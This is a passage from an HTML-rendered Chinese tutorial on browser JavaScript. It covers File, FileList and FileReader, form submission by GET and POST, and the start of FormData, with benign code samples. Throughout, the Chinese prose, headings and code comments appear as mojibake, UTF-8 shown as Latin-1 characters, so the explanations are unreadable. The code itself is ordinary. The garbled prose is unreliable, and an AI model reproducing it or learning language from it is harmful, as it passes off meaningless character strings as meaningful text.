</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”±äº<code>myFile</code>çš„å†…å®¹ä¸ºç©ºï¼Œä¹Ÿæ²¡æœ‰è®¾ç½® MIME ç±»å‹ï¼Œæ‰€ä»¥<code>size</code>å±æ€§ç­‰äº0ï¼Œ<code>type</code>å±æ€§ç­‰äºç©ºå­—ç¬¦ä¸²ã€‚</p> <p>File å¯¹è±¡æ²¡æœ‰è‡ªå·±çš„å®ä¾‹æ–¹æ³•ï¼Œç”±äºç»§æ‰¿äº† Blob å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ Blob çš„å®ä¾‹æ–¹æ³•<code>slice()</code>ã€‚</p> <h2 id="_2-filelist-å¯¹è±¡"><a href="#_2-filelist-å¯¹è±¡" class="header-anchor">#</a> 2.FileList å¯¹è±¡</h2> <p><code>FileList</code>å¯¹è±¡æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œä»£è¡¨ä¸€ç»„é€‰ä¸­çš„æ–‡ä»¶ï¼Œæ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ª File å®ä¾‹ã€‚å®ƒä¸»è¦å‡ºç°åœ¨ä¸¤ä¸ªåœºåˆã€‚</p> <ul><li>æ–‡ä»¶æ§ä»¶èŠ‚ç‚¹ï¼ˆ<code>&lt;input type=&quot;file&quot;&gt;</code>ï¼‰çš„<code>files</code>å±æ€§ï¼Œè¿”å›ä¸€ä¸ª FileList å®ä¾‹ã€‚</li> <li>æ‹–æ‹‰ä¸€ç»„æ–‡ä»¶æ—¶ï¼Œç›®æ ‡åŒºçš„<code>DataTransfer.files</code>å±æ€§ï¼Œè¿”å›ä¸€ä¸ª FileList å®ä¾‹ã€‚</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span>
<span class="token keyword">var</span> files <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileItem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">;</span>
files <span class="token keyword">instanceof</span> <span class="token class-name">FileList</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ–‡ä»¶æ§ä»¶çš„<code>files</code>å±æ€§æ˜¯ä¸€ä¸ª FileList å®ä¾‹ã€‚</p> <p>FileList çš„å®ä¾‹å±æ€§ä¸»è¦æ˜¯<code>length</code>ï¼Œè¡¨ç¤ºåŒ…å«å¤šå°‘ä¸ªæ–‡ä»¶ã€‚</p> <p>FileList çš„å®ä¾‹æ–¹æ³•ä¸»è¦æ˜¯<code>item()</code>ï¼Œç”¨æ¥è¿”å›æŒ‡å®šä½ç½®çš„å®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºä½ç½®çš„åºå·ï¼ˆä»é›¶å¼€å§‹ï¼‰ã€‚ä½†æ˜¯ï¼Œç”±äº FileList çš„å®ä¾‹æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥ç”¨æ–¹æ‹¬å·è¿ç®—ç¬¦ï¼Œå³<code>myFileList[0]</code>ç­‰åŒäº<code>myFileList.item(0)</code>ï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨ä¸åˆ°<code>item()</code>æ–¹æ³•ã€‚</p> <h2 id="_3-filereader-å¯¹è±¡"><a href="#_3-filereader-å¯¹è±¡" class="header-anchor">#</a> 3.FileReader å¯¹è±¡</h2> <p>FileReader å¯¹è±¡ç”¨äºè¯»å– File å¯¹è±¡æˆ– Blob å¯¹è±¡æ‰€åŒ…å«çš„æ–‡ä»¶å†…å®¹ã€‚</p> <p>æµè§ˆå™¨åŸç”Ÿæä¾›ä¸€ä¸ª<code>FileReader</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ FileReader å®ä¾‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>FileReader æœ‰ä»¥ä¸‹çš„å®ä¾‹å±æ€§ã€‚</p> <ul><li>FileReader.errorï¼šè¯»å–æ–‡ä»¶æ—¶äº§ç”Ÿçš„é”™è¯¯å¯¹è±¡</li> <li>FileReader.readyStateï¼šæ•´æ•°ï¼Œè¡¨ç¤ºè¯»å–æ–‡ä»¶æ—¶çš„å½“å‰çŠ¶æ€ã€‚ä¸€å…±æœ‰ä¸‰ç§å¯èƒ½çš„çŠ¶æ€ï¼Œ<code>0</code>è¡¨ç¤ºå°šæœªåŠ è½½ä»»ä½•æ•°æ®ï¼Œ<code>1</code>è¡¨ç¤ºæ•°æ®æ­£åœ¨åŠ è½½ï¼Œ<code>2</code>è¡¨ç¤ºåŠ è½½å®Œæˆã€‚</li> <li>FileReader.resultï¼šè¯»å–å®Œæˆåçš„æ–‡ä»¶å†…å®¹ï¼Œæœ‰å¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ª ArrayBuffer å®ä¾‹ã€‚</li> <li>FileReader.onabortï¼š<code>abort</code>äº‹ä»¶ï¼ˆç”¨æˆ·ç»ˆæ­¢è¯»å–æ“ä½œï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>FileReader.onerrorï¼š<code>error</code>äº‹ä»¶ï¼ˆè¯»å–é”™è¯¯ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>FileReader.onloadï¼š<code>load</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°ï¼Œé€šå¸¸åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢ä½¿ç”¨<code>result</code>å±æ€§ï¼Œæ‹¿åˆ°æ–‡ä»¶å†…å®¹ã€‚</li> <li>FileReader.onloadstartï¼š<code>loadstart</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œå¼€å§‹ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>FileReader.onloadendï¼š<code>loadend</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œç»“æŸï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>FileReader.onprogressï¼š<code>progress</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œè¿›è¡Œä¸­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ç›‘å¬<code>load</code>äº‹ä»¶çš„ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input type=&quot;file&quot; onchange=&quot;onChange(event)&quot;&gt;</span>

<span class="token keyword">function</span> <span class="token function">onChange</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> file <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  reader<span class="token punctuation">.</span><span class="token function">readAsText</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ¯å½“æ–‡ä»¶æ§ä»¶å‘ç”Ÿå˜åŒ–ï¼Œå°±å°è¯•è¯»å–ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æœè¯»å–æˆåŠŸï¼ˆ<code>load</code>äº‹ä»¶å‘ç”Ÿï¼‰ï¼Œå°±æ‰“å°å‡ºæ–‡ä»¶å†…å®¹ã€‚</p> <p>FileReader æœ‰ä»¥ä¸‹å®ä¾‹æ–¹æ³•ã€‚</p> <ul><li>FileReader.abort()ï¼šç»ˆæ­¢è¯»å–æ“ä½œï¼Œ<code>readyState</code>å±æ€§å°†å˜æˆ<code>2</code>ã€‚</li> <li>FileReader.readAsArrayBuffer()ï¼šä»¥ ArrayBuffer çš„æ ¼å¼è¯»å–æ–‡ä»¶ï¼Œè¯»å–å®Œæˆå<code>result</code>å±æ€§å°†è¿”å›ä¸€ä¸ª ArrayBuffer å®ä¾‹ã€‚</li> <li>FileReader.readAsBinaryString()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›åŸå§‹çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li> <li>FileReader.readAsDataURL()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›ä¸€ä¸ª Data URL æ ¼å¼ï¼ˆBase64 ç¼–ç ï¼‰çš„å­—ç¬¦ä¸²ï¼Œä»£è¡¨æ–‡ä»¶å†…å®¹ã€‚å¯¹äºå›¾ç‰‡æ–‡ä»¶ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥ç”¨äº<code>&lt;img&gt;</code>å…ƒç´ çš„<code>src</code>å±æ€§ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ä¸èƒ½ç›´æ¥è¿›è¡Œ Base64 è§£ç ï¼Œå¿…é¡»æŠŠå‰ç¼€<code>data:*/*;base64,</code>ä»å­—ç¬¦ä¸²é‡Œåˆ é™¤ä»¥åï¼Œå†è¿›è¡Œè§£ç ã€‚</li> <li>FileReader.readAsText()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›æ–‡ä»¶å†…å®¹çš„æ–‡æœ¬å­—ç¬¦ä¸²ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»£è¡¨æ–‡ä»¶çš„ Blob å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œè¡¨ç¤ºæ–‡æœ¬ç¼–ç ï¼Œé»˜è®¤ä¸º UTF-8ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">/* HTML ä»£ç å¦‚ä¸‹
  &lt;input type=&quot;file&quot; onchange=&quot;previewFile()&quot;&gt;
  &lt;img src=&quot;&quot; height=&quot;200&quot;&gt;
*/</span>

<span class="token keyword">function</span> <span class="token function">previewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> preview <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> file    <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[type=file]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> reader  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  reader<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    preview<span class="token punctuation">.</span>src <span class="token operator">=</span> reader<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    reader<span class="token punctuation">.</span><span class="token function">readAsDataURL</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·é€‰ä¸­å›¾ç‰‡æ–‡ä»¶ä»¥åï¼Œè„šæœ¬ä¼šè‡ªåŠ¨è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç„¶åä½œä¸ºä¸€ä¸ª Data URL èµ‹å€¼ç»™<code>&lt;img&gt;</code>å…ƒç´ çš„<code>src</code>å±æ€§ï¼Œä»è€ŒæŠŠå›¾ç‰‡å±•ç¤ºå‡ºæ¥ã€‚</p> <h2 id="åä¸€ã€è¡¨å•ï¼Œformdata-å¯¹è±¡"><a href="#åä¸€ã€è¡¨å•ï¼Œformdata-å¯¹è±¡" class="header-anchor">#</a> åä¸€ã€è¡¨å•ï¼ŒFormData å¯¹è±¡</h2> <h2 id="_1-è¡¨å•æ¦‚è¿°"><a href="#_1-è¡¨å•æ¦‚è¿°" class="header-anchor">#</a> 1.è¡¨å•æ¦‚è¿°</h2> <p>è¡¨å•ï¼ˆ<code>&lt;form&gt;</code>ï¼‰ç”¨æ¥æ”¶é›†ç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œå‘é€åˆ°æœåŠ¡å™¨ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œè®©æœåŠ¡å™¨éªŒè¯ï¼Œå°±è¦é€šè¿‡è¡¨å•ã€‚è¡¨å•æä¾›å¤šç§æ§ä»¶ï¼Œè®©å¼€å‘è€…ä½¿ç”¨ï¼Œå…·ä½“çš„æ§ä»¶ç§ç±»å’Œç”¨æ³•è¯·å‚è€ƒ HTML è¯­è¨€çš„æ•™ç¨‹ã€‚æœ¬ç« ä¸»è¦ä»‹ç» JavaScript ä¸è¡¨å•çš„äº¤äº’ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>/handling-page<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç”¨æˆ·åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>user_name<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>passwd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>å¯†ç ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>passwd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>user_passwd<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit_button<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>æäº¤<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>ä¸Šé¢ä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•çš„è¡¨å•ï¼ŒåŒ…å«ä¸‰ä¸ªæ§ä»¶ï¼šç”¨æˆ·åè¾“å…¥æ¡†ã€å¯†ç è¾“å…¥æ¡†å’Œæäº¤æŒ‰é’®ã€‚</p> <p>ç”¨æˆ·ç‚¹å‡»â€œæäº¤â€æŒ‰é’®ï¼Œæ¯ä¸€ä¸ªæ§ä»¶éƒ½ä¼šç”Ÿæˆä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®åæ˜¯æ§ä»¶çš„<code>name</code>å±æ€§ï¼Œé”®å€¼æ˜¯æ§ä»¶çš„<code>value</code>å±æ€§ï¼Œé”®åå’Œé”®å€¼ä¹‹é—´ç”±ç­‰å·è¿æ¥ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·åè¾“å…¥æ¡†çš„<code>name</code>å±æ€§æ˜¯<code>user_name</code>ï¼Œ<code>value</code>å±æ€§æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œå‡å®šæ˜¯â€œå¼ ä¸‰â€ï¼Œæäº¤åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªé”®å€¼å¯¹<code>user_name=å¼ ä¸‰</code>ã€‚</p> <p>æ‰€æœ‰çš„é”®å€¼å¯¹éƒ½ä¼šæäº¤åˆ°æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œæäº¤çš„æ•°æ®æ ¼å¼è·Ÿ<code>&lt;form&gt;</code>å…ƒç´ çš„<code>method</code>å±æ€§æœ‰å…³ã€‚è¯¥å±æ€§æŒ‡å®šäº†æäº¤æ•°æ®çš„ HTTP æ–¹æ³•ã€‚å¦‚æœæ˜¯ GET æ–¹æ³•ï¼Œæ‰€æœ‰é”®å€¼å¯¹ä¼šä»¥ URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²å½¢å¼ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œæ¯”å¦‚<code>/handling-page?user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤</code>ã€‚ä¸‹é¢å°±æ˜¯ GET è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>GET /handling-page?user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤
<span class="token header-name keyword">Host:</span> example.com
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¦‚æœæ˜¯ POST æ–¹æ³•ï¼Œæ‰€æœ‰é”®å€¼å¯¹ä¼šè¿æ¥æˆä¸€è¡Œï¼Œä½œä¸º HTTP è¯·æ±‚çš„æ•°æ®ä½“å‘é€åˆ°æœåŠ¡å™¨ï¼Œæ¯”å¦‚<code>user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤</code>ã€‚ä¸‹é¢å°±æ˜¯ POST è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">POST</span> /handling-page HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> example.com
<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
<span class="token header-name keyword">Content-Length:</span> 74

user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>æ³¨æ„ï¼Œå®é™…æäº¤çš„æ—¶å€™ï¼Œåªè¦é”®å€¼ä¸æ˜¯ URL çš„åˆæ³•å­—ç¬¦ï¼ˆæ¯”å¦‚æ±‰å­—â€œå¼ ä¸‰â€å’Œâ€œæäº¤â€ï¼‰ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¯¹å…¶è¿›è¡Œç¼–ç ã€‚</p> <p>ç‚¹å‡»<code>submit</code>æ§ä»¶ï¼Œå°±å¯ä»¥æäº¤è¡¨å•ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>æäº¤<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢è¡¨å•å°±åŒ…å«ä¸€ä¸ª<code>submit</code>æ§ä»¶ï¼Œç‚¹å‡»è¿™ä¸ªæ§ä»¶ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠè¡¨å•æ•°æ®å‘æœåŠ¡å™¨æäº¤ã€‚</p> <p>æ³¨æ„ï¼Œè¡¨å•é‡Œé¢çš„<code>&lt;button&gt;</code>å…ƒç´ å¦‚æœæ²¡æœ‰ç”¨<code>type</code>å±æ€§æŒ‡å®šç±»å‹ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯<code>submit</code>æ§ä»¶ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>æäº¤<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢è¡¨å•çš„<code>&lt;button&gt;</code>å…ƒç´ ï¼Œç‚¹å‡»ä»¥åä¹Ÿä¼šæäº¤è¡¨å•ã€‚</p> <p>é™¤äº†ç‚¹å‡»<code>submit</code>æ§ä»¶æäº¤è¡¨å•ï¼Œè¿˜å¯ä»¥ç”¨è¡¨å•å…ƒç´ çš„<code>submit()</code>æ–¹æ³•ï¼Œé€šè¿‡è„šæœ¬æäº¤è¡¨å•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>formElement<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¡¨å•å…ƒç´ çš„<code>reset()</code>æ–¹æ³•å¯ä»¥é‡ç½®æ‰€æœ‰æ§ä»¶çš„å€¼ï¼ˆé‡ç½®ä¸ºé»˜è®¤å€¼ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>formElement<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_2-formdata-å¯¹è±¡"><a href="#_2-formdata-å¯¹è±¡" class="header-anchor">#</a> 2.FormData å¯¹è±¡</h2> <h3 id="æ¦‚è¿°-3"><a href="#æ¦‚è¿°-3" class="header-anchor">#</a> æ¦‚è¿°</h3> <p>è¡¨å•æ•°æ®ä»¥é”®å€¼å¯¹çš„å½¢å¼å‘æœåŠ¡å™¨å‘é€ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆçš„ã€‚ä½†æ˜¯æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡è„šæœ¬å®Œæˆè¿‡ç¨‹ï¼Œæ„é€ å’Œç¼–è¾‘è¡¨å•é”®å€¼å¯¹ï¼Œç„¶åé€šè¿‡<code>XMLHttpRequest.send()</code>æ–¹æ³•å‘é€ã€‚æµè§ˆå™¨åŸç”Ÿæä¾›äº† FormData å¯¹è±¡æ¥å®Œæˆè¿™é¡¹å·¥ä½œã€‚</p> <p>FormData é¦–å…ˆæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆå®ä¾‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> formdata <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>
